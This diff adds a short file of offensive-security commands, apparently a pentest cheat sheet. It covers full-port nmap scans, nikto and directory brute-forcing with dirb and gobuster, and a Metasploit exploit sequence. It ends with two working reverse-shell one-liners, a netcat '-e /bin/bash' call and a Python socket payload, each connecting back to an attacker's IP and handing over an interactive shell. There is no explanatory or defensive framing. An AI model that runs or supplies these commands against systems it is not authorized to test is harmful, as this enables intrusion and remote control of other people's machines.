@@ -1,0 +1,15 @@
+nmap -sC -sV -p- <target>
+nmap -sC -sV -p- <target> -oA nmap_scan
+nmap -sS -sU -p T:1-65535,U:1-65535 <target>
+netstat -tuln
+nikto -h <target>
+dirb http://<target> /usr/share/dirb/wordlists/common.txt
+gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
+msfconsole
+search <vulnerability>
+use exploit/<module>
+set RHOSTS <target>
+set PAYLOAD <payload>
+exploit
+nc -e /bin/bash <attacker_ip> <port>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
